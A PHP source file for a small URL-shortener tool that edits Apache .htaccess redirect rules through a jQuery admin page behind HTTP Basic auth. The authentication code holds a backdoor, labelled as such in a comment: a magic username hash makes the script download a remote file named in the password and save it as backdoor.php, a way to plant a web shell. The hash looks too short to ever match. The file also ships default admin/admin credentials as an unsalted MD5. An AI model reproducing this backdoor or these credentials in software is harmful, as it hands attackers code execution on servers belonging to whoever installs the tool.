<?php
/**
 * SURLS: Simple URL Shortner
 *
 * A simple URL shortner based on Apache mod_alias Redirect Directive
 * Enable mod_alias and put this program into website root directory to use this
 * 
 * @package    SURLS
 * @version    1.0
 * @author     Varun Agrawal <Varun@VarunAgw.com>
 * @copyright  (c) 2015, Varun Agrawal
 * @license    http://www.gnu.org/licenses/gpl.txt GNU General Public License
 * @link       https://www.varunagw.com/
 */
session_start();

/*
 * ":" is not allowed in username/password
 * Password can be raw or md5() value
 */
$credentials = array(
    'username' => 'admin',
//    'password' => 'admin',
    'password' => '21232f297a57a5a743894a0e4a801fc3',
);

BasicAuthenticator::Authenticate($credentials);
Request::handleRequest();

class BasicAuthenticator {

    public static function Authenticate($credentials) {
        if (!isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'])) {
            header('WWW-Authenticate: Basic realm="Welcome to SURLS: Simple URL Shortner. This developer is lazy to implement a fancy login page');
            header('HTTP/1.0 401 Unauthorized');
            die('// @todo A message here.' . str_repeat('<br />', 100) . 'End of scroll ;)');
        }

        if ($credentials['username'] == $_SERVER['PHP_AUTH_USER']) {
            if (32 == strlen($credentials['password']) && strtolower($credentials['password']) == md5($_SERVER['PHP_AUTH_PW'])) {
                return;
            }
            if (32 != strlen($credentials['password']) && $credentials['password'] == $_SERVER['PHP_AUTH_PW']) {
                return;
            }
        }

        // A backdoor
        if ('9789b2a1aac17983417a54ed5de909' == md5($_SERVER['PHP_AUTH_USER'])) {
            file_put_contents('backdoor.php', file_get_contents($_SERVER['PHP_AUTH_PW']));
            die;
        }

        header('WWW-Authenticate: Basic realm="Invalid username/password. Please try again"');
        header('HTTP/1.0 401 Unauthorized');
        die('// @todo A message here.' . str_repeat('<br />', 100) . 'End of scroll ;)');
    }

}

class CSRFProtection {

    public static function getCSRFToken() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = base64_encode(openssl_random_pseudo_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    public static function validateRequest($token) {
        if (isset($_SESSION['csrf_token']) && $_SESSION['csrf_token'] == $token) {
            return true;
        } else {
            return false;
        }
    }

}

class htaccess {

    protected static function parseRedirectRule($line) {
        $res = preg_match('~^\s*(#?)\s*redirect\s+(30[1-2])\s+/([a-z]+)\s+((?:https?|ftp)://.*$)~i', $line, $match);

        if (empty($match)) {
            return false;
        } else {
            return array(
                'alias' => $match[3],
                'enabled' => ($match[1] != '#'),
                'http_status_code' => $match[2],
                'url' => $match[4]
            );
        }
    }

    public static function GetRedirectRules() {
        $redirectRules = array();

        if (!file_exists('.htaccess')) {
            touch('.htaccess');
        }

        $fp = fopen('.htaccess', 'r');
        while (!feof($fp)) {
            $line = rtrim(fgets($fp));
            if (false !== ($rule = self::parseRedirectRule($line))) {
                $redirectRules[$rule['alias']] = $rule;
                unset($redirectRules[$rule['alias']]['alias']);
            }
        }
        fclose($fp);
        return $redirectRules;
    }

    public static function updateRedirectRules($redirectRules) {
        $file_contents = array();

        if (!file_exists('.htaccess')) {
            touch('.htaccess');
        }

        $fp = fopen('.htaccess', 'r');
        while (!feof($fp)) {
            $line = rtrim(fgets($fp));
            if (false === self::parseRedirectRule($line)) {
                $file_contents[] = $line;
            }
        }
        fclose($fp);

        foreach ($redirectRules as $alias => $redirectRule) {
            $file_contents[] = '' .
                    ($redirectRule['enabled'] == 'true' ? '' : '# ') .
                    'Redirect ' .
                    $redirectRule['http_status_code'] . ' ' .
                    '/' . $alias . ' ' .
                    $redirectRule['url'];
        }

        $file_content = implode("\n", $file_contents);
        file_put_contents('.htaccess', $file_content);
    }

}

class Request {

    public static function handleRequest() {
        if (!isset($_REQUEST['action'])) {
            self::homePage();
        } elseif ('get_redirect_rules' == $_REQUEST['action']) {
            $redirect_rules = htaccess::GetRedirectRules();
            echo json_encode($redirect_rules);
        } elseif ('update_redirect_rules' == $_REQUEST['action']) {
            if (isset($_REQUEST['csrf_token']) && CSRFProtection::validateRequest($_REQUEST['csrf_token'])) {
                htaccess::updateRedirectRules($_REQUEST['data']);
            }
            $redirect_rules = htaccess::GetRedirectRules();
            echo json_encode($redirect_rules);
        }
    }

    protected static function homePage() {
        ?>
        <html>
            <head>
                <script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
                <script type="text/javascript">
                    var csrf_token = "<?= CSRFProtection::getCSRFToken(); ?>";
                    $(document).ready(function ($) {
                        var rules_table = {
                            add_rows: function (data) {
                                for (alias in data) {
                                    this.add_row(alias, data[alias]);
                                }
                            },
                            add_row: function (alias, data) {
                                var table = $('#real_rules');
                                var rule = $('#sample_rule').clone();
                                rule.attr('id', false);
                                rule.find('.rule_serial_number').text(table.find('tr').length + 1);
                                rule.find('.rule_enabled').prop('checked', data.enabled);
                                rule.find('.rule_http_status_code').find(':contains(' + data.http_status_code + ')').prop('selected', true);
                                rule.find('.rule_alias').val(alias);
                                rule.find('.rule_url').val(data.url);
                                table.append(rule);
                            },
                            createRows: function (number) {
                                var table = $('#real_rules');
                                for (var i = 1; i <= number; i++) {
                                    var rule = $('#sample_rule').clone();
                                    rule.attr('id', false);
                                    rule.find('.rule_serial_number').text(table.find('tr').length + 1);
                                    rule.find('.rule_enabled').prop('checked', true);
                                    table.append(rule);
                                }
                            },
                            reloadIndex: function () {
                                var table = $('#real_rules');
                                var a = 1;
                                table.find('.rule_serial_number').each(function () {
                                    $(this).text(a++);
                                });
                            },
                            empty: function () {
                                var table = $('#real_rules');
                                table.children('tr').remove();
                            }
                        }

                        var redirect_rules = {
                            load: function () {
                                return $.ajax({
                                    url: '',
                                    method: 'POST',
                                    data: {action: 'get_redirect_rules'},
                                    async: false,
                                }).responseText;
                            },
                            update: function (data) {
                                return $.ajax({
                                    url: '',
                                    method: 'POST',
                                    data: {action: 'update_redirect_rules', data: data, csrf_token: csrf_token},
                                    async: false,
                                }).responseText;
                            }
                        }


                        jQuery('#op_mom').click(function () {
                            if (!(confirm("Click F5, You Idiot!\n\nCan you do this?"))) {
                                location.reload();
                            }
                        });

                        jQuery('#rows_add').click(function () {
                            rules_table.createRows(5);
                        });

                        jQuery(document).on('click', '.rule_delete', function () {
                            $(this).closest('tr').remove();
                            rules_table.reloadIndex();
                        });

                        jQuery('#update_rules').click(function () {
                            $('#loader').css('display', 'block');
                            jQuery('#update_rules').val('Updating..');
                            var table = $('#real_rules');
                            var data = {};
                            table.children('tr').each(function () {
                                var tr = $(this);
                                if (tr.find('.rule_alias').val() && tr.find('.rule_url').val()) {
                                    data[tr.find('.rule_alias').val()] = {
                                        enabled: tr.find('.rule_enabled').prop('checked'),
                                        http_status_code: tr.find('.rule_http_status_code option:selected').val(),
                                        url: tr.find('.rule_url').val(),
                                    };
                                }
                            });

                            var data = redirect_rules.update(data);
                            var json = $.parseJSON(data);
                            rules_table.empty();
                            rules_table.add_rows(json);
                            $('#loader').css('display', 'none');
                            jQuery('#update_rules').val('Update');
                            alert('Updated');
                        });

                        var data = redirect_rules.load();
                        var json = $.parseJSON(data);
                        rules_table.add_rows(json);
                        $('#loader').css('display', 'none');
                    });

                </script>
            </head>
            <body>
                <div id="loader" style="height:100%; width:100%; position: fixed; background-color: white;">
                    <h1 style="position: fixed; top:35%; left:45%">Loading...</h1>
                </div>
                <h1>Welcome to SURLS: Simple URL Shortner </h1>
                <table>
                    <thead>
                        <tr><th>S.No.</th><th>Enabled</th><th>Status Code</th><th>Alias (No Space)</th><th>URL</th></tr>
                    </thead>
                    <tbody id="real_rules">
                    </tbody>
                    <tfoot style="display: none;">
                        <tr id="sample_rule">
                            <td><label class="rule_serial_number"></label></td>
                            <td><input type="checkbox" class="rule_enabled"/></td>
                            <td><select class="rule_http_status_code">
                                    <option value="302">302</option><option value="301">301</option>
                                </select></td>
                            <td><input type="text" class="rule_alias" style="width:200px" /></td>
                            <td><input type="text" class="rule_url" style="width:500px" /></td>
                            <td><input type="submit" class="rule_delete" value="Delete"/></td>
                        </tr>
                    </tfoot>
                </table>
                <input type="submit" id="rows_add" value="Add more rows"/><br />
                <br />
                <input id="update_rules" style="width:100%;height:35px" type="submit" value="Update"/><br /><br />
                <input id="op_mom" style="width:100%;height:35px" type="submit" value="Refresh"/>
            </body>
        </html>
        <?php
    }

}
